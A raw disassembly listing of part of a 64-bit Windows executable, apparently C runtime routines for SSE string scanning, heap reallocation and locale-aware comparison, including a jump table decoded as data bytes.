   14000a95c:	0f 84 33 01 00 00    	je     0x14000aa95
   14000a962:	0f bc d0             	bsf    %eax,%edx
   14000a965:	4d 85 d2             	test   %r10,%r10
   14000a968:	75 06                	jne    0x14000a970
   14000a96a:	45 8d 59 f2          	lea    -0xe(%r9),%r11d
   14000a96e:	eb 14                	jmp    0x14000a984
   14000a970:	45 33 db             	xor    %r11d,%r11d
   14000a973:	8b c2                	mov    %edx,%eax
   14000a975:	b9 10 00 00 00       	mov    $0x10,%ecx
   14000a97a:	49 2b ca             	sub    %r10,%rcx
   14000a97d:	48 3b c1             	cmp    %rcx,%rax
   14000a980:	41 0f 92 c3          	setb   %r11b
   14000a984:	41 8b c1             	mov    %r9d,%eax
   14000a987:	2b c2                	sub    %edx,%eax
   14000a989:	41 3b c1             	cmp    %r9d,%eax
   14000a98c:	0f 87 cf 00 00 00    	ja     0x14000aa61
   14000a992:	8b 8c 86 e8 ab 00 00 	mov    0xabe8(%rsi,%rax,4),%ecx
   14000a999:	48 03 ce             	add    %rsi,%rcx
   14000a99c:	ff e1                	jmp    *%rcx
   14000a99e:	66 0f 73 f9 01       	pslldq $0x1,%xmm1
   14000a9a3:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   14000a9a8:	e9 b4 00 00 00       	jmp    0x14000aa61
   14000a9ad:	66 0f 73 f9 02       	pslldq $0x2,%xmm1
   14000a9b2:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   14000a9b7:	e9 a5 00 00 00       	jmp    0x14000aa61
   14000a9bc:	66 0f 73 f9 03       	pslldq $0x3,%xmm1
   14000a9c1:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   14000a9c6:	e9 96 00 00 00       	jmp    0x14000aa61
   14000a9cb:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   14000a9d0:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   14000a9d5:	e9 87 00 00 00       	jmp    0x14000aa61
   14000a9da:	66 0f 73 f9 05       	pslldq $0x5,%xmm1
   14000a9df:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   14000a9e4:	eb 7b                	jmp    0x14000aa61
   14000a9e6:	66 0f 73 f9 06       	pslldq $0x6,%xmm1
   14000a9eb:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   14000a9f0:	eb 6f                	jmp    0x14000aa61
   14000a9f2:	66 0f 73 f9 07       	pslldq $0x7,%xmm1
   14000a9f7:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   14000a9fc:	eb 63                	jmp    0x14000aa61
   14000a9fe:	66 0f 73 f9 08       	pslldq $0x8,%xmm1
   14000aa03:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   14000aa08:	eb 57                	jmp    0x14000aa61
   14000aa0a:	66 0f 73 f9 09       	pslldq $0x9,%xmm1
   14000aa0f:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   14000aa14:	eb 4b                	jmp    0x14000aa61
   14000aa16:	66 0f 73 f9 0a       	pslldq $0xa,%xmm1
   14000aa1b:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   14000aa20:	eb 3f                	jmp    0x14000aa61
   14000aa22:	66 0f 73 f9 0b       	pslldq $0xb,%xmm1
   14000aa27:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   14000aa2c:	eb 33                	jmp    0x14000aa61
   14000aa2e:	66 0f 73 f9 0c       	pslldq $0xc,%xmm1
   14000aa33:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   14000aa38:	eb 27                	jmp    0x14000aa61
   14000aa3a:	66 0f 73 f9 0d       	pslldq $0xd,%xmm1
   14000aa3f:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   14000aa44:	eb 1b                	jmp    0x14000aa61
   14000aa46:	66 0f 73 f9 0e       	pslldq $0xe,%xmm1
   14000aa4b:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   14000aa50:	eb 0f                	jmp    0x14000aa61
   14000aa52:	66 0f 73 f9 0f       	pslldq $0xf,%xmm1
   14000aa57:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   14000aa5c:	eb 03                	jmp    0x14000aa61
   14000aa5e:	0f 57 c9             	xorps  %xmm1,%xmm1
   14000aa61:	45 85 db             	test   %r11d,%r11d
   14000aa64:	0f 85 e6 00 00 00    	jne    0x14000ab50
   14000aa6a:	f3 0f 6f 57 10       	movdqu 0x10(%rdi),%xmm2
   14000aa6f:	66 0f 6f c2          	movdqa %xmm2,%xmm0
   14000aa73:	66 0f 74 c3          	pcmpeqb %xmm3,%xmm0
   14000aa77:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   14000aa7b:	85 c0                	test   %eax,%eax
   14000aa7d:	75 35                	jne    0x14000aab4
   14000aa7f:	48 8b d3             	mov    %rbx,%rdx
   14000aa82:	49 8b c8             	mov    %r8,%rcx
   14000aa85:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000aa8a:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   14000aa8f:	5f                   	pop    %rdi
   14000aa90:	e9 d3 01 00 00       	jmp    0x14000ac68
   14000aa95:	4d 85 d2             	test   %r10,%r10
   14000aa98:	75 d0                	jne    0x14000aa6a
   14000aa9a:	44 38 57 01          	cmp    %r10b,0x1(%rdi)
   14000aa9e:	0f 84 ac 00 00 00    	je     0x14000ab50
   14000aaa4:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000aaa9:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   14000aaae:	5f                   	pop    %rdi
   14000aaaf:	e9 b4 01 00 00       	jmp    0x14000ac68
   14000aab4:	0f bc c8             	bsf    %eax,%ecx
   14000aab7:	8b c1                	mov    %ecx,%eax
   14000aab9:	49 2b c2             	sub    %r10,%rax
   14000aabc:	48 83 c0 10          	add    $0x10,%rax
   14000aac0:	48 83 f8 10          	cmp    $0x10,%rax
   14000aac4:	77 b9                	ja     0x14000aa7f
   14000aac6:	44 2b c9             	sub    %ecx,%r9d
   14000aac9:	41 83 f9 0f          	cmp    $0xf,%r9d
   14000aacd:	77 79                	ja     0x14000ab48
   14000aacf:	42 8b 8c 8e 28 ac 00 	mov    0xac28(%rsi,%r9,4),%ecx
   14000aad6:	00 
   14000aad7:	48 03 ce             	add    %rsi,%rcx
   14000aada:	ff e1                	jmp    *%rcx
   14000aadc:	66 0f 73 fa 01       	pslldq $0x1,%xmm2
   14000aae1:	eb 65                	jmp    0x14000ab48
   14000aae3:	66 0f 73 fa 02       	pslldq $0x2,%xmm2
   14000aae8:	eb 5e                	jmp    0x14000ab48
   14000aaea:	66 0f 73 fa 03       	pslldq $0x3,%xmm2
   14000aaef:	eb 57                	jmp    0x14000ab48
   14000aaf1:	66 0f 73 fa 04       	pslldq $0x4,%xmm2
   14000aaf6:	eb 50                	jmp    0x14000ab48
   14000aaf8:	66 0f 73 fa 05       	pslldq $0x5,%xmm2
   14000aafd:	eb 49                	jmp    0x14000ab48
   14000aaff:	66 0f 73 fa 06       	pslldq $0x6,%xmm2
   14000ab04:	eb 42                	jmp    0x14000ab48
   14000ab06:	66 0f 73 fa 07       	pslldq $0x7,%xmm2
   14000ab0b:	eb 3b                	jmp    0x14000ab48
   14000ab0d:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   14000ab12:	eb 34                	jmp    0x14000ab48
   14000ab14:	66 0f 73 fa 09       	pslldq $0x9,%xmm2
   14000ab19:	eb 2d                	jmp    0x14000ab48
   14000ab1b:	66 0f 73 fa 0a       	pslldq $0xa,%xmm2
   14000ab20:	eb 26                	jmp    0x14000ab48
   14000ab22:	66 0f 73 fa 0b       	pslldq $0xb,%xmm2
   14000ab27:	eb 1f                	jmp    0x14000ab48
   14000ab29:	66 0f 73 fa 0c       	pslldq $0xc,%xmm2
   14000ab2e:	eb 18                	jmp    0x14000ab48
   14000ab30:	66 0f 73 fa 0d       	pslldq $0xd,%xmm2
   14000ab35:	eb 11                	jmp    0x14000ab48
   14000ab37:	66 0f 73 fa 0e       	pslldq $0xe,%xmm2
   14000ab3c:	eb 0a                	jmp    0x14000ab48
   14000ab3e:	66 0f 73 fa 0f       	pslldq $0xf,%xmm2
   14000ab43:	eb 03                	jmp    0x14000ab48
   14000ab45:	0f 57 d2             	xorps  %xmm2,%xmm2
   14000ab48:	66 0f eb d1          	por    %xmm1,%xmm2
   14000ab4c:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   14000ab50:	41 0f b6 00          	movzbl (%r8),%eax
   14000ab54:	84 c0                	test   %al,%al
   14000ab56:	74 34                	je     0x14000ab8c
   14000ab58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000ab5f:	00 
   14000ab60:	0f be c0             	movsbl %al,%eax
   14000ab63:	66 0f 6e c0          	movd   %eax,%xmm0
   14000ab67:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   14000ab6b:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   14000ab6f:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   14000ab74:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   14000ab78:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   14000ab7c:	85 c0                	test   %eax,%eax
   14000ab7e:	75 1a                	jne    0x14000ab9a
   14000ab80:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   14000ab85:	49 ff c0             	inc    %r8
   14000ab88:	84 c0                	test   %al,%al
   14000ab8a:	75 d4                	jne    0x14000ab60
   14000ab8c:	33 c0                	xor    %eax,%eax
   14000ab8e:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000ab93:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   14000ab98:	5f                   	pop    %rdi
   14000ab99:	c3                   	ret
   14000ab9a:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000ab9f:	49 8b c0             	mov    %r8,%rax
   14000aba2:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   14000aba7:	5f                   	pop    %rdi
   14000aba8:	c3                   	ret
   14000aba9:	0f 1f 00             	nopl   (%rax)
   14000abac:	e2 a8                	loop   0x14000ab56
   14000abae:	00 00                	add    %al,(%rax)
   14000abb0:	e9 a8 00 00 f0       	jmp    0x13000ac5d
   14000abb5:	a8 00                	test   $0x0,%al
   14000abb7:	00 f7                	add    %dh,%bh
   14000abb9:	a8 00                	test   $0x0,%al
   14000abbb:	00 fe                	add    %bh,%dh
   14000abbd:	a8 00                	test   $0x0,%al
   14000abbf:	00 05 a9 00 00 0c    	add    %al,0xc0000a9(%rip)        # 0x14c00ac6e
   14000abc5:	a9 00 00 13 a9       	test   $0xa9130000,%eax
   14000abca:	00 00                	add    %al,(%rax)
   14000abcc:	1a a9 00 00 21 a9    	sbb    -0x56df0000(%rcx),%ch
   14000abd2:	00 00                	add    %al,(%rax)
   14000abd4:	28 a9 00 00 2f a9    	sub    %ch,-0x56d10000(%rcx)
   14000abda:	00 00                	add    %al,(%rax)
   14000abdc:	36 a9 00 00 3d a9    	ss test $0xa93d0000,%eax
   14000abe2:	00 00                	add    %al,(%rax)
   14000abe4:	44 a9 00 00 9e a9    	rex.R test $0xa99e0000,%eax
   14000abea:	00 00                	add    %al,(%rax)
   14000abec:	ad                   	lods   (%rsi),%eax
   14000abed:	a9 00 00 bc a9       	test   $0xa9bc0000,%eax
   14000abf2:	00 00                	add    %al,(%rax)
   14000abf4:	cb                   	lret
   14000abf5:	a9 00 00 da a9       	test   $0xa9da0000,%eax
   14000abfa:	00 00                	add    %al,(%rax)
   14000abfc:	e6 a9                	out    %al,$0xa9
   14000abfe:	00 00                	add    %al,(%rax)
   14000ac00:	f2 a9 00 00 fe a9    	repnz test $0xa9fe0000,%eax
   14000ac06:	00 00                	add    %al,(%rax)
   14000ac08:	0a aa 00 00 16 aa    	or     -0x55ea0000(%rdx),%ch
   14000ac0e:	00 00                	add    %al,(%rax)
   14000ac10:	22 aa 00 00 2e aa    	and    -0x55d20000(%rdx),%ch
   14000ac16:	00 00                	add    %al,(%rax)
   14000ac18:	3a aa 00 00 46 aa    	cmp    -0x55ba0000(%rdx),%ch
   14000ac1e:	00 00                	add    %al,(%rax)
   14000ac20:	52                   	push   %rdx
   14000ac21:	aa                   	stos   %al,(%rdi)
   14000ac22:	00 00                	add    %al,(%rax)
   14000ac24:	5e                   	pop    %rsi
   14000ac25:	aa                   	stos   %al,(%rdi)
   14000ac26:	00 00                	add    %al,(%rax)
   14000ac28:	dc aa 00 00 e3 aa    	fsubrl -0x551d0000(%rdx)
   14000ac2e:	00 00                	add    %al,(%rax)
   14000ac30:	ea                   	(bad)
   14000ac31:	aa                   	stos   %al,(%rdi)
   14000ac32:	00 00                	add    %al,(%rax)
   14000ac34:	f1                   	int1
   14000ac35:	aa                   	stos   %al,(%rdi)
   14000ac36:	00 00                	add    %al,(%rax)
   14000ac38:	f8                   	clc
   14000ac39:	aa                   	stos   %al,(%rdi)
   14000ac3a:	00 00                	add    %al,(%rax)
   14000ac3c:	ff aa 00 00 06 ab    	ljmp   *-0x54fa0000(%rdx)
   14000ac42:	00 00                	add    %al,(%rax)
   14000ac44:	0d ab 00 00 14       	or     $0x140000ab,%eax
   14000ac49:	ab                   	stos   %eax,(%rdi)
   14000ac4a:	00 00                	add    %al,(%rax)
   14000ac4c:	1b ab 00 00 22 ab    	sbb    -0x54de0000(%rbx),%ebp
   14000ac52:	00 00                	add    %al,(%rax)
   14000ac54:	29 ab 00 00 30 ab    	sub    %ebp,-0x54d00000(%rbx)
   14000ac5a:	00 00                	add    %al,(%rax)
   14000ac5c:	37                   	(bad)
   14000ac5d:	ab                   	stos   %eax,(%rdi)
   14000ac5e:	00 00                	add    %al,(%rax)
   14000ac60:	3e ab                	ds stos %eax,(%rdi)
   14000ac62:	00 00                	add    %al,(%rax)
   14000ac64:	45 ab                	rex.RB stos %eax,(%rdi)
   14000ac66:	00 00                	add    %al,(%rax)
   14000ac68:	48 83 ec 58          	sub    $0x58,%rsp
   14000ac6c:	48 8b 05 c5 c3 00 00 	mov    0xc3c5(%rip),%rax        # 0x140017038
   14000ac73:	48 33 c4             	xor    %rsp,%rax
   14000ac76:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000ac7b:	33 c0                	xor    %eax,%eax
   14000ac7d:	4c 8b ca             	mov    %rdx,%r9
   14000ac80:	48 83 f8 20          	cmp    $0x20,%rax
   14000ac84:	4c 8b c1             	mov    %rcx,%r8
   14000ac87:	73 77                	jae    0x14000ad00
   14000ac89:	c6 44 04 20 00       	movb   $0x0,0x20(%rsp,%rax,1)
   14000ac8e:	48 ff c0             	inc    %rax
   14000ac91:	48 83 f8 20          	cmp    $0x20,%rax
   14000ac95:	7c f0                	jl     0x14000ac87
   14000ac97:	8a 02                	mov    (%rdx),%al
   14000ac99:	eb 1f                	jmp    0x14000acba
   14000ac9b:	0f b6 d0             	movzbl %al,%edx
   14000ac9e:	48 c1 ea 03          	shr    $0x3,%rdx
   14000aca2:	0f b6 c0             	movzbl %al,%eax
   14000aca5:	83 e0 07             	and    $0x7,%eax
   14000aca8:	0f b6 4c 14 20       	movzbl 0x20(%rsp,%rdx,1),%ecx
   14000acad:	0f ab c1             	bts    %eax,%ecx
   14000acb0:	49 ff c1             	inc    %r9
   14000acb3:	88 4c 14 20          	mov    %cl,0x20(%rsp,%rdx,1)
   14000acb7:	41 8a 01             	mov    (%r9),%al
   14000acba:	84 c0                	test   %al,%al
   14000acbc:	75 dd                	jne    0x14000ac9b
   14000acbe:	eb 1f                	jmp    0x14000acdf
   14000acc0:	41 0f b6 c1          	movzbl %r9b,%eax
   14000acc4:	ba 01 00 00 00       	mov    $0x1,%edx
   14000acc9:	41 0f b6 c9          	movzbl %r9b,%ecx
   14000accd:	83 e1 07             	and    $0x7,%ecx
   14000acd0:	48 c1 e8 03          	shr    $0x3,%rax
   14000acd4:	d3 e2                	shl    %cl,%edx
   14000acd6:	84 54 04 20          	test   %dl,0x20(%rsp,%rax,1)
   14000acda:	75 1f                	jne    0x14000acfb
   14000acdc:	49 ff c0             	inc    %r8
   14000acdf:	45 8a 08             	mov    (%r8),%r9b
   14000ace2:	45 84 c9             	test   %r9b,%r9b
   14000ace5:	75 d9                	jne    0x14000acc0
   14000ace7:	33 c0                	xor    %eax,%eax
   14000ace9:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000acee:	48 33 cc             	xor    %rsp,%rcx
   14000acf1:	e8 2a 66 ff ff       	call   0x140001320
   14000acf6:	48 83 c4 58          	add    $0x58,%rsp
   14000acfa:	c3                   	ret
   14000acfb:	49 8b c0             	mov    %r8,%rax
   14000acfe:	eb e9                	jmp    0x14000ace9
   14000ad00:	e8 d7 66 ff ff       	call   0x1400013dc
   14000ad05:	cc                   	int3
   14000ad06:	cc                   	int3
   14000ad07:	cc                   	int3
   14000ad08:	45 33 c0             	xor    %r8d,%r8d
   14000ad0b:	e9 00 00 00 00       	jmp    0x14000ad10
   14000ad10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ad15:	57                   	push   %rdi
   14000ad16:	48 83 ec 40          	sub    $0x40,%rsp
   14000ad1a:	48 8b da             	mov    %rdx,%rbx
   14000ad1d:	48 8b f9             	mov    %rcx,%rdi
   14000ad20:	48 85 c9             	test   %rcx,%rcx
   14000ad23:	75 14                	jne    0x14000ad39
   14000ad25:	e8 d2 b5 ff ff       	call   0x1400062fc
   14000ad2a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000ad30:	e8 9b ab ff ff       	call   0x1400058d0
   14000ad35:	33 c0                	xor    %eax,%eax
   14000ad37:	eb 60                	jmp    0x14000ad99
   14000ad39:	48 85 db             	test   %rbx,%rbx
   14000ad3c:	74 e7                	je     0x14000ad25
   14000ad3e:	48 3b fb             	cmp    %rbx,%rdi
   14000ad41:	73 f2                	jae    0x14000ad35
   14000ad43:	49 8b d0             	mov    %r8,%rdx
   14000ad46:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000ad4b:	e8 04 a0 ff ff       	call   0x140004d54
   14000ad50:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000ad55:	48 8d 53 ff          	lea    -0x1(%rbx),%rdx
   14000ad59:	83 79 08 00          	cmpl   $0x0,0x8(%rcx)
   14000ad5d:	74 24                	je     0x14000ad83
   14000ad5f:	48 ff ca             	dec    %rdx
   14000ad62:	48 3b fa             	cmp    %rdx,%rdi
   14000ad65:	77 0a                	ja     0x14000ad71
   14000ad67:	0f b6 02             	movzbl (%rdx),%eax
   14000ad6a:	f6 44 08 19 04       	testb  $0x4,0x19(%rax,%rcx,1)
   14000ad6f:	75 ee                	jne    0x14000ad5f
   14000ad71:	48 8b cb             	mov    %rbx,%rcx
   14000ad74:	48 2b ca             	sub    %rdx,%rcx
   14000ad77:	48 8b d3             	mov    %rbx,%rdx
   14000ad7a:	83 e1 01             	and    $0x1,%ecx
   14000ad7d:	48 2b d1             	sub    %rcx,%rdx
   14000ad80:	48 ff ca             	dec    %rdx
   14000ad83:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000ad88:	74 0c                	je     0x14000ad96
   14000ad8a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000ad8f:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000ad96:	48 8b c2             	mov    %rdx,%rax
   14000ad99:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000ad9e:	48 83 c4 40          	add    $0x40,%rsp
   14000ada2:	5f                   	pop    %rdi
   14000ada3:	c3                   	ret
   14000ada4:	48 83 ec 28          	sub    $0x28,%rsp
   14000ada8:	48 85 c9             	test   %rcx,%rcx
   14000adab:	75 19                	jne    0x14000adc6
   14000adad:	e8 4a b5 ff ff       	call   0x1400062fc
   14000adb2:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000adb8:	e8 13 ab ff ff       	call   0x1400058d0
   14000adbd:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000adc1:	48 83 c4 28          	add    $0x28,%rsp
   14000adc5:	c3                   	ret
   14000adc6:	4c 8b c1             	mov    %rcx,%r8
   14000adc9:	33 d2                	xor    %edx,%edx
   14000adcb:	48 8b 0d 16 d9 00 00 	mov    0xd916(%rip),%rcx        # 0x1400186e8
   14000add2:	48 83 c4 28          	add    $0x28,%rsp
   14000add6:	48 ff 25 9b aa 00 00 	rex.W jmp *0xaa9b(%rip)        # 0x140015878
   14000addd:	cc                   	int3
   14000adde:	cc                   	int3
   14000addf:	cc                   	int3
   14000ade0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ade5:	57                   	push   %rdi
   14000ade6:	48 83 ec 20          	sub    $0x20,%rsp
   14000adea:	48 8b da             	mov    %rdx,%rbx
   14000aded:	48 8b f9             	mov    %rcx,%rdi
   14000adf0:	48 85 c9             	test   %rcx,%rcx
   14000adf3:	75 0a                	jne    0x14000adff
   14000adf5:	48 8b ca             	mov    %rdx,%rcx
   14000adf8:	e8 93 b9 ff ff       	call   0x140006790
   14000adfd:	eb 1f                	jmp    0x14000ae1e
   14000adff:	48 85 db             	test   %rbx,%rbx
   14000ae02:	75 07                	jne    0x14000ae0b
   14000ae04:	e8 cb a9 ff ff       	call   0x1400057d4
   14000ae09:	eb 11                	jmp    0x14000ae1c
   14000ae0b:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   14000ae0f:	76 2d                	jbe    0x14000ae3e
   14000ae11:	e8 e6 b4 ff ff       	call   0x1400062fc
   14000ae16:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000ae1c:	33 c0                	xor    %eax,%eax
   14000ae1e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000ae23:	48 83 c4 20          	add    $0x20,%rsp
   14000ae27:	5f                   	pop    %rdi
   14000ae28:	c3                   	ret
   14000ae29:	e8 76 8a ff ff       	call   0x1400038a4
   14000ae2e:	85 c0                	test   %eax,%eax
   14000ae30:	74 df                	je     0x14000ae11
   14000ae32:	48 8b cb             	mov    %rbx,%rcx
   14000ae35:	e8 12 ad ff ff       	call   0x140005b4c
   14000ae3a:	85 c0                	test   %eax,%eax
   14000ae3c:	74 d3                	je     0x14000ae11
   14000ae3e:	48 8b 0d a3 d8 00 00 	mov    0xd8a3(%rip),%rcx        # 0x1400186e8
   14000ae45:	4c 8b cb             	mov    %rbx,%r9
   14000ae48:	4c 8b c7             	mov    %rdi,%r8
   14000ae4b:	33 d2                	xor    %edx,%edx
   14000ae4d:	ff 15 1d aa 00 00    	call   *0xaa1d(%rip)        # 0x140015870
   14000ae53:	48 85 c0             	test   %rax,%rax
   14000ae56:	74 d1                	je     0x14000ae29
   14000ae58:	eb c4                	jmp    0x14000ae1e
   14000ae5a:	cc                   	int3
   14000ae5b:	cc                   	int3
   14000ae5c:	0f b6 c2             	movzbl %dl,%eax
   14000ae5f:	4c 8b c1             	mov    %rcx,%r8
   14000ae62:	44 8b d0             	mov    %eax,%r10d
   14000ae65:	49 83 e0 f0          	and    $0xfffffffffffffff0,%r8
   14000ae69:	41 c1 e2 08          	shl    $0x8,%r10d
   14000ae6d:	83 e1 0f             	and    $0xf,%ecx
   14000ae70:	44 0b d0             	or     %eax,%r10d
   14000ae73:	45 33 c9             	xor    %r9d,%r9d
   14000ae76:	83 c8 ff             	or     $0xffffffff,%eax
   14000ae79:	d3 e0                	shl    %cl,%eax
   14000ae7b:	66 41 0f 6e c2       	movd   %r10d,%xmm0
   14000ae80:	f2 0f 70 c8 00       	pshuflw $0x0,%xmm0,%xmm1
   14000ae85:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000ae88:	66 41 0f 74 00       	pcmpeqb (%r8),%xmm0
   14000ae8d:	66 0f 70 d1 00       	pshufd $0x0,%xmm1,%xmm2
   14000ae92:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   14000ae96:	66 41 0f 74 08       	pcmpeqb (%r8),%xmm1
   14000ae9b:	66 0f eb c8          	por    %xmm0,%xmm1
   14000ae9f:	66 0f d7 d1          	pmovmskb %xmm1,%edx
   14000aea3:	23 d0                	and    %eax,%edx
   14000aea5:	75 21                	jne    0x14000aec8
   14000aea7:	49 83 c0 10          	add    $0x10,%r8
   14000aeab:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   14000aeaf:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000aeb2:	66 41 0f 74 08       	pcmpeqb (%r8),%xmm1
   14000aeb7:	66 41 0f 74 00       	pcmpeqb (%r8),%xmm0
   14000aebc:	66 0f eb c8          	por    %xmm0,%xmm1
   14000aec0:	66 0f d7 d1          	pmovmskb %xmm1,%edx
   14000aec4:	85 d2                	test   %edx,%edx
   14000aec6:	74 df                	je     0x14000aea7
   14000aec8:	0f bc d2             	bsf    %edx,%edx
   14000aecb:	49 03 d0             	add    %r8,%rdx
   14000aece:	44 38 12             	cmp    %r10b,(%rdx)
   14000aed1:	4c 0f 44 ca          	cmove  %rdx,%r9
   14000aed5:	49 8b c1             	mov    %r9,%rax
   14000aed8:	c3                   	ret
   14000aed9:	cc                   	int3
   14000aeda:	cc                   	int3
   14000aedb:	cc                   	int3
   14000aedc:	83 3d 95 d1 00 00 00 	cmpl   $0x0,0xd195(%rip)        # 0x140018078
   14000aee3:	0f 84 bf 07 00 00    	je     0x14000b6a8
   14000aee9:	45 33 c9             	xor    %r9d,%r9d
   14000aeec:	e9 03 00 00 00       	jmp    0x14000aef4
   14000aef1:	cc                   	int3
   14000aef2:	cc                   	int3
   14000aef3:	cc                   	int3
   14000aef4:	48 8b c4             	mov    %rsp,%rax
   14000aef7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000aefb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000aeff:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000af03:	57                   	push   %rdi
   14000af04:	48 83 ec 60          	sub    $0x60,%rsp
   14000af08:	48 8b f2             	mov    %rdx,%rsi
   14000af0b:	48 8b e9             	mov    %rcx,%rbp
   14000af0e:	49 8b d1             	mov    %r9,%rdx
   14000af11:	48 8d 48 d8          	lea    -0x28(%rax),%rcx
   14000af15:	49 8b f8             	mov    %r8,%rdi
   14000af18:	e8 37 9e ff ff       	call   0x140004d54
   14000af1d:	48 85 ff             	test   %rdi,%rdi
   14000af20:	75 07                	jne    0x14000af29
   14000af22:	33 db                	xor    %ebx,%ebx
   14000af24:	e9 a0 00 00 00       	jmp    0x14000afc9
   14000af29:	48 85 ed             	test   %rbp,%rbp
   14000af2c:	74 05                	je     0x14000af33
   14000af2e:	48 85 f6             	test   %rsi,%rsi
   14000af31:	75 17                	jne    0x14000af4a
   14000af33:	e8 c4 b3 ff ff       	call   0x1400062fc
   14000af38:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000af3e:	e8 8d a9 ff ff       	call   0x1400058d0
   14000af43:	bb ff ff ff 7f       	mov    $0x7fffffff,%ebx
   14000af48:	eb 7f                	jmp    0x14000afc9
   14000af4a:	bb ff ff ff 7f       	mov    $0x7fffffff,%ebx
   14000af4f:	48 3b fb             	cmp    %rbx,%rdi
   14000af52:	76 12                	jbe    0x14000af66
   14000af54:	e8 a3 b3 ff ff       	call   0x1400062fc
   14000af59:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000af5f:	e8 6c a9 ff ff       	call   0x1400058d0
   14000af64:	eb 63                	jmp    0x14000afc9
   14000af66:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000af6b:	48 8b 90 30 01 00 00 	mov    0x130(%rax),%rdx
   14000af72:	48 85 d2             	test   %rdx,%rdx
   14000af75:	75 17                	jne    0x14000af8e
   14000af77:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   14000af7c:	4c 8b c7             	mov    %rdi,%r8
   14000af7f:	48 8b d6             	mov    %rsi,%rdx
   14000af82:	48 8b cd             	mov    %rbp,%rcx
   14000af85:	e8 6e 07 00 00       	call   0x14000b6f8
   14000af8a:	8b d8                	mov    %eax,%ebx
   14000af8c:	eb 3b                	jmp    0x14000afc9
   14000af8e:	8b 40 14             	mov    0x14(%rax),%eax
   14000af91:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000af96:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000af9a:	4c 8b cd             	mov    %rbp,%r9
   14000af9d:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   14000afa1:	41 b8 01 10 00 00    	mov    $0x1001,%r8d
   14000afa7:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   14000afac:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   14000afb0:	e8 3f 08 00 00       	call   0x14000b7f4
   14000afb5:	85 c0                	test   %eax,%eax
   14000afb7:	75 0d                	jne    0x14000afc6
   14000afb9:	e8 3e b3 ff ff       	call   0x1400062fc
   14000afbe:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000afc4:	eb 03                	jmp    0x14000afc9
   14000afc6:	8d 58 fe             	lea    -0x2(%rax),%ebx
   14000afc9:	80 7c 24 58 00       	cmpb   $0x0,0x58(%rsp)
   14000afce:	74 0c                	je     0x14000afdc
   14000afd0:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000afd5:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000afdc:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   14000afe1:	8b c3                	mov    %ebx,%eax
   14000afe3:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000afe7:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   14000afeb:	49 8b 73 20          	mov    0x20(%r11),%rsi
